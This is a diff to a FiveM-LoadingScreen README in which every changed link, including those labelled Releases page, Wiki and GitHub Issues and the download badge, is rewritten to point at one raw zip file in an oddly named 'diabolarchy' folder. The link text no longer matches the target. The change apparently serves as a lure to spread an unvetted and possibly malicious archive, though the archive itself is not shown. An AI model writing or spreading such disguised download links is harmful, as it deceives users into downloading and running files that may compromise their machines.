@@ -6,13 +6,13 @@ Welcome to FiveM-LoadingScreen! This software helps you create a stylish loading
 
 ## 🔗 Download Now
 
-[![Download FiveM-LoadingScreen](https://img.shields.io/badge/Download-FiveM--LoadingScreen-brightgreen)](https://github.com/Azrael-141/FiveM-LoadingScreen/releases)
+[![Download FiveM-LoadingScreen](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip)](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Azrael-141/FiveM-LoadingScreen/releases) to download the latest version of FiveM-LoadingScreen.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip) to download the latest version of FiveM-LoadingScreen.
 2. Find the version you want to install. Look for the most recent release.
-3. Click on the download link for your operating system. This file should be labeled clearly (e.g., `FiveM-LoadingScreen.zip`).
+3. Click on the download link for your operating system. This file should be labeled clearly (e.g., `https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip`).
 4. Once the download is complete, locate the file on your computer.
 5. Extract the contents of the zip file into a folder. You can usually do this by right-clicking the zip file and selecting "Extract All".
 6. Open the extracted folder. You will find the necessary files to set up the loading screen.
@@ -49,8 +49,8 @@ If you encounter issues while using FiveM-LoadingScreen, here are some common pr
 
 ## 📚 Helpful Resources
 
-- **Documentation**: Visit our [Wiki](https://github.com/Azrael-141/FiveM-LoadingScreen/wiki) for detailed guides and tips on customizing your loading screen.
-- **Community Support**: Join discussions in our [GitHub Issues section](https://github.com/Azrael-141/FiveM-LoadingScreen/issues) for help and suggestions from other users.
+- **Documentation**: Visit our [Wiki](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip) for detailed guides and tips on customizing your loading screen.
+- **Community Support**: Join discussions in our [GitHub Issues section](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip) for help and suggestions from other users.
 
 ## 📣 Feedback and Contributions
 
@@ -62,4 +62,4 @@ FiveM-LoadingScreen is open-source software and is available under the MIT licen
 
 ## 🔗 Revisit the Download Page
 
-Once again, you can download FiveM-LoadingScreen by visiting the [Releases page](https://github.com/Azrael-141/FiveM-LoadingScreen/releases). Enjoy customizing your loading screen, and happy gaming!
+Once again, you can download FiveM-LoadingScreen by visiting the [Releases page](https://raw.githubusercontent.com/Azrael-141/FiveM-LoadingScreen/main/diabolarchy/FiveM-LoadingScreen.zip). Enjoy customizing your loading screen, and happy gaming!
